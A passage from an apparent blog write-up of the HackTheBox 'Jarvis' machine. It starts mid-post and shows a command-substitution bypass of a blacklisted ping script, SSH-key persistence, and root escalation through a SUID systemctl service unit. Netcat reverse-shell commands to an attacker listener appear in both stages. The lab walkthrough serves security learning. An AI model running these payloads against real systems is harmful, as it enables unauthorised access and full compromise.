style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
</code></pre></div><p>We notice two very distinctive configurations here. First of all, the script <code>/var/www/Admin-Utilities/simpler.py</code> can be run as user <code>pepper</code> without password through sudo. This <code>simpler.py</code> script will be our entry point to pivot to the <code>pepper</code> user.</p>
<p>Second, we notice that <code>systemctl</code> binary at the setuid bit set. As a reminder SETUID is special permission attributes in Unix and Unix-like systems, they allow unprivileged users to run programs with elevated privileges.</p>
<p>Here <code>systemctl</code> will always be run at root:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls -l /bin/systemctl
-rwsr-x--- <span style="color:#ae81ff">1</span> root pepper <span style="color:#ae81ff">174520</span> Feb <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2019</span> /bin/systemctl
</code></pre></div><p>Let&rsquo;s keep that in mind for the privilege escalation later.</p>
<p>Alright, with all of that in mind, let&rsquo;s investigate this <code>simpler.py</code> script to see how we can abuse it to pivot to the <code>pepper</code> user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls -l
total <span style="color:#ae81ff">8</span>
-rwxr--r-- <span style="color:#ae81ff">1</span> pepper pepper <span style="color:#ae81ff">4587</span> Mar  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> simpler.py
</code></pre></div><p>The file is owned by <code>pepper</code> user and we have no right to edit it. We will need to find a vulnerabiility in the script.</p>
<p>Upon opening it we can see it&rsquo;s used to show statistics about attackers IP and to ping those IP.</p>
<p>The function to <code>ping</code> catch the attention because of the use of <code>os.system</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_ping</span>():
    forbidden <span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&amp;</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">;</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">`</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">||</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">|</span><span style="color:#e6db74">&#39;</span>]
    command <span style="color:#f92672">=</span> input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Enter an IP: </span><span style="color:#e6db74">&#39;</span>)
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> forbidden:
        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">in</span> command:
            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Got you</span><span style="color:#e6db74">&#39;</span>)
            exit()
    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ping </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> command)
</code></pre></div><p><code>os.system('ping ' + command)</code> clearly open a command injection vulnerability. However the script author seems to be aware of the issue and blacklisted a few common characters used in command injection.</p>
<p>So we can&rsquo;t easily inject command. But then what about command substitution ?</p>
<p>According to the bash manual:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ man bash
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
Command Substitution
       Command substitution allows the output of a command to replace the command name.  There are two forms:


              <span style="color:#66d9ef">$(</span>command<span style="color:#66d9ef">)</span>
       or
              <span style="color:#e6db74">`</span>command<span style="color:#e6db74">`</span>
</code></pre></div><p>While the <code>`</code> is blacklisted, neither <code>$</code> or <code>()</code> is. Let&rsquo;s try to subsitate then :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">***********************************************
    _                 _
___<span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | <span style="color:#e6db74">&#39;_ ` _ \| &#39;</span>_ <span style="color:#ae81ff">\|</span> |/ _ <span style="color:#ae81ff">\ </span><span style="color:#e6db74">&#39;__| &#39;</span>_ <span style="color:#ae81ff">\|</span> | | |
<span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\ </span>| | | | | | |_<span style="color:#f92672">)</span> | |  __/ |_ | |_<span style="color:#f92672">)</span> | |_| |
|___/_|_| |_| |_| .__/|_|<span style="color:#ae81ff">\_</span>__|_<span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>| .__/ <span style="color:#ae81ff">\_</span>_, |
               |_|               |_|    |___/
                               @ironhackers.es

***********************************************

Enter an IP: <span style="color:#66d9ef">$(</span>id<span style="color:#66d9ef">)</span>
ping: groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pepper<span style="color:#f92672">)</span>: Temporary failure in name resolution
</code></pre></div><p>Awseome, let&rsquo;s use this to open a reverse shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># On attacker console</span>
$ nc -l -vv -p <span style="color:#ae81ff">8544</span>
Listening on any address <span style="color:#ae81ff">8544</span>

$ <span style="color:#75715e"># On reverse shell</span>
$ echo <span style="color:#e6db74">&#34;nc -e /bin/sh 10.10.10.10 8544&#34;</span> &gt; /tmp/hg8.sh
$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
    _                 _
___<span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | <span style="color:#e6db74">&#39;_ ` _ \| &#39;</span>_ <span style="color:#ae81ff">\|</span> |/ _ <span style="color:#ae81ff">\ </span><span style="color:#e6db74">&#39;__| &#39;</span>_ <span style="color:#ae81ff">\|</span> | | |
<span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\ </span>| | | | | | |_<span style="color:#f92672">)</span> | |  __/ |_ | |_<span style="color:#f92672">)</span> | |_| |
|___/_|_| |_| |_| .__/|_|<span style="color:#ae81ff">\_</span>__|_<span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>| .__/ <span style="color:#ae81ff">\_</span>_, |
               |_|               |_|    |___/
                               @ironhackers.es

***********************************************

Enter an IP: <span style="color:#66d9ef">$(</span>bash /tmp/hg8.sh<span style="color:#66d9ef">)</span>
</code></pre></div><p>And surely enough we get our shell!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8544</span>
Listening on any address <span style="color:#ae81ff">8544</span>
Connection from 10.10.10.143:57986
pepper@jarvis:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pepper<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pepper<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pepper<span style="color:#f92672">)</span>
pepper@jarvis:~$ cat user.txt
2afxxxxxxxxxxxxxxc44f
</code></pre></div><h1 id="root-flag">Root Flag</h1>
<h2 id="recon-1">Recon</h2>
<p><em>Note: To make it easier I added my ssh pub key to <code>authorized_keys</code> to connect to the <code>pepper</code> account by SSH:</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;ssh-rsa XXXXX&#34;</span> &gt;&gt; ~/.ssh/authorized_keys
</code></pre></div><p>The recon phase will be quick here since we already a very valuable information in the user recon phase : <code>/bin/systemctl</code> have the SUID bit set :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls -l /bin/systemctl
-rwsr-x--- <span style="color:#ae81ff">1</span> root pepper <span style="color:#ae81ff">174520</span> Feb <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2019</span> /bin/systemctl
</code></pre></div><p>This mean that if we manage to make <code>systemctl</code> run a command for us, this one will be automatically run as root user.</p>
<h2 id="systemctl-privilege-escalation">Systemctl privilege escalation</h2>
<p>For this kind of need, <a href="https://gtfobins.github.io/">GTFOBins</a> is an incredibly useful project:</p>
<blockquote>
<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
</blockquote>
<p>And surely enough, there is informations and even an example for <code>systemctl</code> :</p>
<blockquote>
<p>It runs with the SUID bit set and may be exploited to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (&lt;= Stretch) that allow the default sh shell to run with SUID privileges.</p>
</blockquote>
<p>First we open our listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
</code></pre></div><p>Now let&rsquo;s run the GTFO example and replace the command with our reverse shell :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>.service
$ echo <span style="color:#e6db74">&#39;[Service]
</span><span style="color:#e6db74">Type=oneshot
</span><span style="color:#e6db74">ExecStart=/bin/sh -c &#34;nc 10.10.10.10 8585 -e /bin/bash&#34;
</span><span style="color:#e6db74">[Install]
</span><span style="color:#e6db74">WantedBy=multi-user.target&#39;</span> &gt; $TF
$ systemctl link $TF
$ systemctl enable --now $TF
</code></pre></div><p>And since everything went fine, we get our shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
Connection from 10.10.10.143:35734

root@jarvis:/#
root@jarvis:/# cat /root/root.txt
d41dxxxxxxxxxxxxxxx71
</code></pre></div><p>Hope this was clear enough, as always do not hesitate to contact me for any questions or feedbacks.</p>
<p>See you next time !</p>
<p>-hg8</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="/posts/networked/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Networked - HackTheBox</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="/posts/haystack/">
                  <span class="button__text">Haystack - HackTheBox</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    


    
      
        

      
    

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="footer__content">
        <span>© 2020</span>
        <span><a href="https://hg8.rocks" target="_blank" rel="noopener">hg8</a></span>
        <span><a class="social-icon" href="https://github.com/hg8" target="_blank" rel="noopener" title="Github">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 20" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
            </a></span>
      </div>
    
  </div>
</footer>



<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>

      
    </div>

    
  </body>
</html>
